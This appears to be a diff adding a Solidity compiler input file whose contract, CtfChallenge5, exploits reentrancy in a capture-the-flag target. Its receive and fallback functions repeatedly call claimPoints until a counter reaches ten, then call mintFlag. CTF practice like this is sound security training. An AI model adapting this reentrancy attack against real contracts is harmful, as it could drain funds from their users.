@@ -1,0 +1,36 @@
+{
+  "language": "Solidity",
+  "sources": {
+    "contracts/CtfChallenge5.sol": {
+      "content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.28;\n\ncontract CtfChallenge5 {\n    IChallenge5 public challenge;\n    uint256 public callCount = 0;\n    uint256 public constant TARGET = 10;\n\n    constructor(address _challengeAddress) {\n        challenge = IChallenge5(_challengeAddress);\n    }\n\n    function startClaim() external {\n        callCount = 0;\n        challenge.claimPoints();\n    }\n\n    receive() external payable {\n        if (callCount < TARGET) {\n            callCount++;\n            challenge.claimPoints();\n        } else if (callCount == TARGET) {\n            callCount++;\n            challenge.mintFlag();\n        }\n    }\n\n    fallback() external payable {\n        if (callCount < TARGET) {\n            callCount++;\n            challenge.claimPoints();\n        } else if (callCount == TARGET) {\n            callCount++;\n            challenge.mintFlag();\n        }\n    }\n}\n\n\ninterface IChallenge5 {\n    function claimPoints() external;\n    function mintFlag() external;\n    function resetPoints() external;\n}"
+    }
+  },
+  "settings": {
+    "evmVersion": "paris",
+    "optimizer": {
+      "enabled": false,
+      "runs": 200
+    },
+    "outputSelection": {
+      "*": {
+        "*": [
+          "abi",
+          "evm.bytecode",
+          "evm.deployedBytecode",
+          "evm.methodIdentifiers",
+          "metadata",
+          "devdoc",
+          "userdoc",
+          "storageLayout",
+          "evm.gasEstimates"
+        ],
+        "": [
+          "ast"
+        ]
+      }
+    },
+    "metadata": {
+      "useLiteralContent": true
+    }
+  }
+}
